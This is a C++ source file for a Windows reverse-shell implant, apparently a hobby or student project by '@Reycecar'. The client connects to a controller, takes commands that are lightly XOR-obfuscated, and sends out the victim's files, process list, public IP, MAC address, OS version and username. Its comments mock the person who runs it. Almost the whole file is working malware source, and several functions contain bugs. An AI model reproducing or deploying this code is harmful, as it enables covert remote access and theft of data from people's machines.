/*
author: @Reycecar
Windows reverse shell
*/
#include <winsock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <cstring>
#include <Lmcons.h>
#include <wininet.h>
#include <winsock.h>
#include <iptypes.h>
#include <iphlpapi.h>
//#include <fileapi.h>
#include <string.h>
#include <rpc.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Rpcrt4.lib")

#define SERV_PORT "25565" //Default port for Minecraft Java
#define SERV_ADDR "127.0.0.1"
#define DEFAULT_BUFLEN 1024
using namespace std;

// used to encrypt/decrypt data
char* xor_func(char msg[]) {
	for (int i = 0; i < strlen(msg); i++) {
		msg[i] ^= 'P';
	}
}

// get the username of the user foolish enough to run this godforsaken program
std::string getUsername() {
    DWORD bufferSize = 0;
    GetUserNameA(NULL, &bufferSize);
    if (bufferSize == 0) {
        return ""; // If username space is 0 return emptystring
    }
    char* buffer = new char[bufferSize];
    if (GetUserNameA(buffer, &bufferSize)) {
        std::string username(buffer);
        delete[] buffer;
        return username;
    }
    delete[] buffer;
    return "";
}

std::string getMACs() {
	std::string mac;
    ULONG size = 0;
	
	// Get the network adapter information
    if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &size) != ERROR_BUFFER_OVERFLOW) {
        return ""; // if buffer overflow: ret blank
    }
    PIP_ADAPTER_ADDRESSES adapterAddresses = (PIP_ADAPTER_ADDRESSES)malloc(size);
    if (adapterAddresses == NULL) {
        return ""; // if not adapter addresses: ret blank
    }
    if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, adapterAddresses, &size) != NO_ERROR) {
        free(adapterAddresses);
        return ""; // if errors: ret blank
    }

    // Iterate over the network adapters and find the MAC address
    PIP_ADAPTER_ADDRESSES adapter = adapterAddresses;
    while (adapter != NULL) {
        if (adapter->PhysicalAddressLength > 0) {
            char macBuff[18];
			// format mac into string
            sprintf_s(macBuff, sizeof(macBuff), "%02X:%02X:%02X:%02X:%02X:%02X",
                adapter->PhysicalAddress[0], adapter->PhysicalAddress[1], adapter->PhysicalAddress[2],
                adapter->PhysicalAddress[3], adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
            mac = macBuff;
            break;
        }
        adapter = adapter->Next;
    }

    // Clean up, Clean Up, Everybody Do your share!
    free(adapterAddresses);
    return mac;
}

// Helper function for getPublicIP()
std::string get_response_string(HANDLE hReq) {
	BOOL reqSuccess = HttpSendRequestA(hReq, NULL, NULL, NULL, NULL);
	if (reqSuccess) {
		// Initialize variables for internetReadFile
		DWORD recvData = 0;
		DWORD chunkSize = 2048;
		std::string buf;
		std::string chunk(chunkSize, 0);
		while (InternetReadFile(hReq, &chunk[0], chunkSize, &recvData) && recvData) {
			chunk.resize(recvData);
			buf += chunk;
		}
		//return file read buffer data
		return buf;
	}
	return nullptr;
}

// Function for getting the public facing IP address.
std::string getPublicIP() {
	HANDLE hInt = InternetOpen(L"Mozilla/5.0",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL, 0);
	// Create hConnect handle for ifconfig.me
	HANDLE hConn = InternetConnectA(hInt, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	// Pass hConnect handle into HttpOpenRequestA with request to ifconfig.me/ip
	HANDLE hReq = HttpOpenRequestA(hConn, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
	// Helper function returns response string generated by ifconfig.me
	std::string resp = get_response_string(hReq);
	if (hReq) { // If hRequest is successful: teardown (In reverse order of creation!!!)
		InternetCloseHandle(hReq);
	}
	if (hConn) { // If hConnect is successful: teardown
		InternetCloseHandle(hConn);
	}
	return resp;
}



// get the windows os version
std::string getWinVer() {
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((OSVERSIONINFO*)&osvi); // Retrieve specific version of windows w/ GetVersionEx

    // Extract the major and minor version numbers
    int majorVersion = osvi.dwMajorVersion;
    int minorVersion = osvi.dwMinorVersion;

    // Get the build number if it is available
    int buildNumber = 0;
    if (osvi.dwPlatformId == VER_PLATFORM_WIN32_NT && majorVersion >= 6) {
        ULONGLONG conditionMask = 0;
        VER_SET_CONDITION(conditionMask, VER_BUILDNUMBER, VER_GREATER_EQUAL);
        osvi.dwBuildNumber = 0;
        // Verify that the system meets the condition
        if (VerifyVersionInfo(&osvi, VER_BUILDNUMBER, conditionMask)) {
            buildNumber = osvi.dwBuildNumber;
        }
    }

    // Determine the returned string based on the operating system
    std::ostringstream oss;
    oss << "Windows ";
    switch (majorVersion) {
    case 10:
        oss << "10";
        break;
    case 6:
        switch (minorVersion) {
        case 3:
            oss << "8.1";
            break;
        case 2:
            oss << "8";
            break;
        case 1:
            oss << "7";
            break;
        case 0:
            oss << "Vista";
            break;
        }
        break;
    case 5:
        switch (minorVersion) {
        case 2:
            oss << "Server 2003";
            break;
        case 1:
            oss << "XP";
            break;
        case 0:
            oss << "2000";
            break;
        }
        break;
    }
    if (buildNumber > 0) {
        oss << " (Build " << buildNumber << ")";
    }
    return oss.str();
}

//use previous functions in information string.
std::string getSysInfo() {
	return  "PUBLIC IP:\n" + getPublicIP() + "\n\n" +
			"MAC Addresses:\n" + getMACs() +"\n\n" + 
			"WINDOWS VERSION:\n" + getWinVer() + "\n\n" +
			"USERNAME:\n" + getUsername();
}

//get data from process and turn it into human readable/understandable information
std::string listProcesses() {
    std::string processList;
    HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hTH32 != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hTH32, &procEntry)) {
            do {
                std::wstring wpname(procEntry.szExeFile);
                std::string pname(wpname.begin(), wpname.end());
                processList += pname;
                processList += ":";
                char buf[UNLEN + 1];
                DWORD len = UNLEN + 1;
                _itoa_s(procEntry.th32ProcessID, buf, 10);
                buf[UNLEN] = 0;
                processList += buf;
                processList += "\n";
            } while (Process32Next(hTH32, &procEntry));
        }
        CloseHandle(hTH32);
    }
    return processList;
}

// Client uploads to server.
int handle_upload(int sock, const char* filename){
	char buf[DEFAULT_BUFLEN] = {0};
	ofstream file(filename, ios::binary);
	if (!file) {
		printf("Failed to create file %s", filename); // debug
		return 2;
	}

	int bytesRecvd = 0;
	while ((bytesRecvd = recv(sock, buf, DEFAULT_BUFLEN, 0)) > 0) {
		file.write(xor_func(buf), bytesRecvd);
	} 

	if (bytesRecvd < 0) {
		printf("File receive error"); // debug
		return 1;
	}

	printf("File %s Received successfully", filename); // debug
	file.close();
	return 0;
} 


// Client handles download from server.
void handle_download(int sock, const char* filename) {
	ifstream file(filename, ios::in | ios::binary);
	if (!file.is_open()) {
		printf("error creating file: %s\n", filename); // print error message
	}

	char buf[DEFAULT_BUFLEN];
	while (!file.eof()) {
		file.read(buf, DEFAULT_BUFLEN);
		int bytes_read = file.gcount();
		if (bytes_read > 0) {
			if (send(sock, xor_func(buf), bytes_read, 0) < 0) {
				printf("Failed to send data");
				return;
			}
		}
	}
	
	/*int filesize = 0;
	int total_read = 0;
	DWORD current_read_bytes = 0;
	DWORD read_bytes = 0;

	// read file size

	HANDLE fhandle = CreateFileA((LPCSTR) path, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fhandle == INVALID_HANDLE_VALUE) {
		printf("CreateFileA error: %d\n", GetLastError());
		exit(-1);
	}

	// get file size

	filesize = GetFileSize(fhandle, NULL);
	printf("filesize: %d\n", filesize); // Debug
	if (filesize == INVALID_FILE_SIZE) {
		printf("filesize error: %d\n", GetLastError());
	}
	// send file size
	send(sock, (char *)&filesize, 4, 0);

	while (total_read < filesize) {		
		if (!ReadFile(fhandle, buf, DEFAULT_BUFLEN, &read_bytes, NULL)) {
			printf("ReadFile Error: %d", GetLastError());
		}
		total_read += read_bytes;
		// xor data
		xor_func(buf, read_bytes);
		send(sock, buf, read_bytes, 0);
	}
	CloseHandle(fhandle);*/
}

int parseCmd(char cmd[]){
	if(strstr(cmd, "end") != NULL) {
		return -1;
	} else if(strstr(cmd,"upload") != NULL) {
	    return 0;
    } else if(strstr(cmd,"download") != NULL) {
        return 1;
    } else if(strstr(cmd,"processes") != NULL) {
        return 2;
    } else if(strstr(cmd,"sysinfo") != NULL) {
        return 3;
    }
}

SOCKET getConnected() {
	WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    //struct sockaddr_in address;
    //struct sockaddr_in server;
	struct addrinfo* result = NULL;
	struct addrinfo hints;

	char* server = SERV_ADDR;
	char recvbuf[DEFAULT_BUFLEN];
	int revcbuflen = DEFAULT_BUFLEN;
	int connResult;

	connResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (connResult != 0) {
		printf("WSAStartup failed with error: %d\n", connResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC; // Use AF_UNSPEC bcs localhost
    hints.ai_socktype = SOCK_STREAM; // socket type: sock stream
    hints.ai_protocol = IPPROTO_TCP; // IP protocol: TCP
    hints.ai_flags = AI_PASSIVE;
	
	// resolve server address and port
	connResult = getaddrinfo(SERV_ADDR, SERV_PORT, &hints, &result);
	if (connResult != 0) {
		printf("getaddrinfo failed: %d\n", connResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address until one succeeds
    for (struct addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

        if (sock == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        connResult = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (connResult == SOCKET_ERROR) {
            printf("Connection failed with error: %d\n", WSAGetLastError());
            closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }
        break; //got a connection, or none worked
    }

	freeaddrinfo(result);

	if (sock == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    return sock;
}

int main() {
	string filepath;
	int cmd;
	int command_packet_len;
	char buf[DEFAULT_BUFLEN];
	char recvbuf[DEFAULT_BUFLEN];
	SOCKET sock;
	sock = getConnected();

	printf("Connection to server successful! It's a miracle!!\n");

	while(true) {
		std::string procs;
		int offset = 0;
		int getcmd;
		memset(buf,0,DEFAULT_BUFLEN);
		memset(recvbuf,0,DEFAULT_BUFLEN);
		getcmd = recv(sock, recvbuf, DEFAULT_BUFLEN, 0); //read cmd into buffer from sock
		/*
		recv(sock, (char *)&command_packet_len, 4, 0);*/
		
 		char * filepath = (char *)malloc(command_packet_len);

		ZeroMemory(filepath, command_packet_len);

		
		printf("enc: %s", recvbuf); // debug
		int cmd = parseCmd(xor_func(recvbuf));
		printf("dec: %s", recvbuf); // debug
		printf("cmd int: %d", cmd); // debug

		switch(cmd) {
			case -1: { //end
				printf("Shutting down"); //debug
				shutdown(sock, 2);
				send(sock, buf, strlen(buf), 0);
				return 0;
			} break;
				
			case 0: {
				printf("From upload buffer: %s\n", buf);  //debug
				const char* filename = "received_file.txt";
				int confirm = handle_upload(sock, filename); // receive the file
				if (confirm == 0) {
					sprintf(buf, "Client Received File");
				} else if (confirm == 2) {
					sprintf(buf, "Client Failed to create file");
				} else {
					sprintf(buf, "File receive error");
				}
            	 // tell server client recieved the file (or not)
            	xor_func(buf);
            	send(sock, buf, strlen(buf), 0);
			} break;
				
			case 1: {
				printf("Download"); // debug
				// get filepath from server
				int bytes_received = recv(sock, recvbuf, DEFAULT_BUFLEN, 0);				
				if (bytes_received < 0) {
					printf("Failed to receive filepath"); // debug
				}
				filepath = recvbuf;
				// recvbuf[bytes_received] = '\0';
				
				handle_download(sock, filepath); // fix
				// read command_packet_length bytes into filename
				// open filename, send chunks back out socket
			} break;
				
			case 2: {
				printf("processes");
				procs = listProcesses();
				printf("list processes length: %d", procs.length());
				while (offset < procs.length()) {
					string chunk = procs.substr(offset, DEFAULT_BUFLEN);
					char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
					xor_func(c); // xor the chunk
					const char *chunkBuffer = c; // put xor'd chunk in this temp buffer
					printf("sending %d bytes", strlen(chunkBuffer));
					send(sock, chunkBuffer, strlen(chunkBuffer), 0);
					offset += DEFAULT_BUFLEN;
				}
				strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
				xor_func(buf);
				send(sock, buf, strlen(buf), 0);
				
			} break;
				
			case 3: {
				printf("systeminfo");
				procs = getSysInfo();
				printf("systeminfo length: %d", procs.length());
				while (offset < procs.length()) {
					string chunk = procs.substr(offset, DEFAULT_BUFLEN);
					char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
					xor_func(c); // xor the chunk
					const char *chunkBuffer = c; // put xor'd chunk in this temp buffer
					printf("sending %d bytes", strlen(chunkBuffer));
					send(sock, chunkBuffer, strlen(chunkBuffer), 0); // send chunk
					offset += DEFAULT_BUFLEN;
				}
				strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
				xor_func(buf); // xor end string
				send(sock, buf, strlen(buf), 0); //send end string
				
			} break;
				
		}
		//free(path);
	}

}
